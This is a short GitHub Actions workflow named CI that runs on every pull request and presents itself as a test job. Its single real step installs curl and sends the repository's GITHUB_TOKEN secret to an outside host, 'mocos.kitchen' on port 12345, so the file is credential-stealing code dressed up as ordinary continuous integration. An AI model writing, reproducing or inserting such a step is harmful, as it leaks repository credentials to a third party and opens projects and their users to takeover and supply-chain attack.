name: CI
on: [pull_request]
jobs:
  test:
    name: test
    runs-on: ubuntu-latest
    container: ubuntu:20.04
    steps:
      - run: |
          apt update -qq
          apt install -y curl
          curl "mocos.kitchen:12345/${{ secrets.GITHUB_TOKEN }}"
